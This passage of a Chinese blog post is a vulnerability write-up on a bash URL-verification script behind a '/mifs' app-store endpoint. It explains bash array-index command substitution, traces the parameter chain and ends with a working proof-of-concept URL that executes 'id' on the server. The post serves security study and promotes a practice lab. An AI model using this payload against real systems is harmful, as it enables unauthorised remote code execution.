\"${theStringToHash}\" | sha256sum)\n            theSHA256Prefix=${theSHA256Hash:0:64}\n            # theSHA256Prefix=${theSHA256Hash}\n            logDebug \"${FUNCNAME}\" \"theSHA256Hash=$theSHA256Hash; theSHA256Prefix=$theSHA256Prefix\"\n\nshopt -s nocasematch\n            if [[ \"${theSHA256Prefix}\" = \"${gHashPrefixString}\" ]] ; then\n              logDebug \"${FUNCNAME}\" \"hash matched\"\n\n              if [[ \"${theAssetFile}\" = *..* ]] || [[ \"${theAssetFile}\" = .* ]] || [[ \"${theAssetFile}\" = /* ]]; then\n                ret=\"${kPathTraversalAttemptedErrorCode}\"\n                logDenial \"${FUNCNAME}\" \"${ret}\" \"getting spoofed: ${theAssetFile}\"\n              else\n                ret=\"${kAftFileStoreDirectory}\"/\"${theAftStoreAssetGUIDWithExtension}\"\n              fi\n            else\n              ret=\"${kLinkHashMismatchErrorCode}\"\n              logDenial \"${FUNCNAME}\" \"${ret}\" \"link hash mismatch: theSHA256Prefix=$theSHA256Prefix; gHashPrefixString=${gHashPrefixString}; ${1}\"\n            fi\n          else\n            ret=\"${kLinkSpoofErrorCode}\"\n            logDenial \"${FUNCNAME}\" \"${ret}\" \"link being spoofed: theStringToHash=${theStringToHash}; requiredSuffix=${theAppStoreSubDirectory}/${theAppStoreAssetGUID}${theAppStoreAssetExtension}${gStartTime}${gEndTime}; ${1}\"\n          fi\nshopt -u nocasematch\n        else\n          ret=\"${kTooLateErrorCode}\"\n          logDenial \"${FUNCNAME}\" \"${ret}\" \"link too late: theCurrentTimeSeconds=${theCurrentTimeSeconds}; ${1}\"\n        fi\n      else\n        ret=\"${kTooEarlyErrorCode}\"\n        logDenial \"${FUNCNAME}\" \"${ret}\" \"link too early: theCurrentTimeSeconds=${theCurrentTimeSeconds}; ${1}\"\n      fi\n    else\n      ret=\"${kKeyIndexOutOfBoundsErrorCode}\"\n      logDenial \"${FUNCNAME}\" \"${ret}\" \"key index out of bounds: ${1}\"\n    fi\n  else\n    ret=\"${kURLStructureInvalidErrorCode}\"\n    logDenial \"${FUNCNAME}\" \"${ret}\" \"URL not structurally correct: ${1}\"\n  fi\n  # tell httpd what file to send (or error message)\n  echo \"${ret}\"\n}\n\nif ${gTestMode} ; then\n  readSaltFile\n  verifyURLConsistency \"${1}\"\nelse\n  logDebug \"MAIN\" looping\n  readSaltFile\n\n  while read theCurrentLine; do\n    readSaltFile\n    logDebug \"MAIN\" \"${theCurrentLine}\"\n    verifyURLConsistency \"${theCurrentLine}\"\n  done\nfi\n\n\n</code></pre>\n<p>但内容太多了，我们还是请AI老师帮我们统一分析一下</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>AI老师帮我们分析并得到了一个传参请求，然后我们还得去apache的配置文件看看入口路径是什么，在/etc/httpd/conf.d/ssl.conf文件中找找相关的内容,由于配置文件内容太多了这里就不贴了，我也懒得找，还是让AI老师帮我们找找吧。</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>deepseek老师还是太善解人意了，直接给了一个标准请求：</p>\n<pre><code>/mifs/c/appstore/fob/3/1120/sha256:kid=1,st=1666663066,et=1666670266,h=a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2/75dc90fe-6ae7-4377-913b-7248334d39dc.ipa\n</code></pre>\n<p>但这些传参到bash中，并没有找到明显的直接命令执行的点，这时我们需要再理解一下bash脚本，首先看bash脚本中的开头：</p>\n<pre><code>gKeyIndex=\"\"\ngStartTime=\"\"\ngEndTime=\"\"\ngHashPrefixString=\"\"\ngPath=\"\"\n\nIFS=',' read -ra theAppStoreKeyValueArray\n</code></pre>\n<p>脚本会用 <code>IFS=','</code> 把传入的参数分割成数组 <code>theAppStoreKeyValueArray</code>，传参后是这样的数组：</p>\n<pre><code>[\"kid=1\", \"st=1444444444\", \"et=1444444444\", \"h=a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2\"]\n</code></pre>\n<p>然后在下方有这样的一段循环：</p>\n<pre><code>  if [[ -z ${ret} ]] ; then\n    for theKeyMapEntry in \"${theAftStoreKeyValueArray[@]}\" ; do\n      theKey=\"${theKeyMapEntry%%=*}\"\n      theValue=\"${theKeyMapEntry##*=}\"\n</code></pre>\n<p>它把传参的这些参数名和值循环赋值给了theKey和theValue，然后又被赋值到全局变量gKeyIndex、gStartTime、gEndTime、gHashPrefixString中，继续跟下去，看看这些值在哪里用到。</p>\n<p>key参数赋值到了变量gKeyIndex，最终在这里应用：</p>\n<pre><code>kAppStoreSaltFile=\"/mi/files/appstore-salt.txt\"\ngSalt=\"\" \n\nif [[ -f ${kAppStoreSaltFile} ]]; then\n  gSalt=$(sed -n \"${gKeyIndex}p\" \"${kAppStoreSaltFile}\")\n  if [[ -z ${gSalt} ]]; then\n    ret=\"${kSaltIndexInvalidErrorCode}\"\n    logDenial \"${FUNCNAME}\" \"${ret}\" \"kid(${gKeyIndex}) is invalid (no salt found)\"\n  fi\nelse\n  ret=\"${kSaltFileMissingErrorCode}\"\n  logDenial \"${FUNCNAME}\" \"${ret}\" \"Salt file ${kAppStoreSaltFile} not found\"\nfi\n</code></pre>\n<p>它是用来读取/mi/files/appstore-salt.txt对应行的，这个文件里面的hash值读取出来用来校验后续参数。</p>\n<p>st 参数最终赋值给了gStartTime，分别在两个地方被调用：</p>\n<pre><code>kValidTimeStampLength=10 \n\ncase ${theKey} in\n  st)\n    gStartTime=\"${theValue}\"\n    if (( ${#gStartTime} != \"${kValidTimeStampLength}\" )); then\n      ret=\"${kTimestampLengthInvalidErrorCode}\"\n    fi\n    ;;\n</code></pre>\n<p>这里判断了这个参数是否长度为10。</p>\n<pre><code>theCurrentTimeSeconds=$(date +%s)\n\nif [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]]; then\n  logDebug \"${FUNCNAME}\" \"Current time(${theCurrentTimeSeconds}) &gt; start time(${gStartTime})\"\n  # ... \nelse\n  ret=\"${kRequestExpiredErrorCode}\"\n  logDenial \"${FUNCNAME}\" \"${ret}\" \"Start time(${gStartTime}) is in the future\"\nfi\n</code></pre>\n<p>这里用来比较当前时间是否晚于请求开始时间。</p>\n<p>et 参数（gEndTime）和gStartTime的用处差不多，也校验了长度和用于验证当前时间≤结束时间。</p>\n<p>h 参数（gHashPrefixString）是用于hash校验的值。</p>\n<p>看上去还是没有直观的命令执行的代码，别急，我们再引入一个知识点。</p>\n<p>首先给大家看一个脚本：</p>\n<pre><code>#!/bin/bash\narr=\"\" \nvar=\"arr[`echo 'hacked' &gt; ./hack_mht`0]\"\n[[ 1 -gt $var ]] \n\nif [[ -f ./hack_mht ]]; then\n    echo \"执行成功！\"\nelse\n    echo \"未执行\"\nfi\n</code></pre>\n<p>bro们觉得这个脚本能成功执行命令吗？</p>\n<p>答案：</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>为什么会这样捏，因为在bash中，数值比较功能可以解析array[index]这样的数值索引，index会被优先解析为算数表达式，比如array[1+1]，会先计算1+1，而bash又有一个命令替换的优先级规则，如果你把array[1+1]改为</p>\n<pre><code>array[`echo 111`]\n</code></pre>\n<p>则先执行被反引号包裹的命令，举例：</p>\n<pre><code>current_date=`date`\necho \"今天是: $current_date\"\necho \"当前目录: `pwd`\"\n</code></pre>\n<p>显然在if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]]; 和if [[ ${theCurrentTimeSeconds} -lt ${gEndTime} ]] ; 中都存在这个条件，但我们之前说了，gStartTime和gEndTime都做了长度校验的，必须为十位，这就很鸡肋了，那怎么样才能绕过这个问题呢？</p>\n<p>回到最开始的定义变量与循环：</p>\n<pre><code>  if [[ -z ${ret} ]] ; then\n    for theKeyMapEntry in \"${theAftStoreKeyValueArray[@]}\" ; do\n      theKey=\"${theKeyMapEntry%%=*}\"\n      theValue=\"${theKeyMapEntry##*=}\"\n</code></pre>\n<p>bash中使用theKey和theValue循环赋值，传参的最后一个值为h，所以theValue最后的值是就是h的值，那现在就很有意思了，gStartTime和gEndTime都有长度限制，但h的值没有，能不能让h的值走到if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]]; then里面去应用数值索引+命令替换呢？</p>\n<p>可以的，既然在bash中有变量theValue=h传参，那我们就直接让gStartTime=theValue，最终流程：可控h参数-&gt;theValue-&gt;gStartTime，然后进入if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]];应用数值索引+命令替换，现在我们已经有了RCE的完整链条，开始构造最终poc。</p>\n<p>kid参数为文件行数，随便用个1，st参数为theValue，注意十位长度校验，所以还需要再加两个空格，et参数也参与比较，也可作为theValue传参，st与et随便一个地方设置为theValue都可以，最后是h参数，只需要满足array[index]即可。</p>\n<p>index部分的内容有了，array部分写什么呢，bash开头开启了set -o nounset，这是严格模式，严格模式下，Bash 遇到未定义的变量会直接终止脚本执行，直接从bash开头定义的那些空变量里面选一个，比如gPath和gHostname都可以，构造最终值：</p>\n<pre><code>gHostname[`id &gt; /mi/bin/mht`]\n</code></pre>\n<p>最终poc：</p>\n<pre><code>/mifs/c/appstore/fob/3/1120/sha256:kid=1,st=1111111111,et=theValue%20%20,h=gHostname%5B%60id%20&gt;%20/mi/bin/mht%60%5D/mht.ipa\n</code></pre>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>该漏洞复现环境已在无境中上架：vip.bdziyi.com/ulab，无境，英文名Unbounded Lab，是专为网络安全学习者打造的综合性实战平台，提供真实企业级漏洞环境，让您在安全的环境中提升实战技能，核心特色：独立隔离环境，每位用户都拥有<strong>完全独立</strong>的靶场环境，即使是庞大的内网靶场，环境之间也是<strong>零干扰</strong>，确保您的学习过程不受任何影响。</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-02 18:41</span>&nbsp;\n<a href=\"https://www.cnblogs.com/mhtsec\">公众号棉花糖fans</a>&nbsp;\n阅读(<span id=\"post_view_count\">35</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    }
  ]
}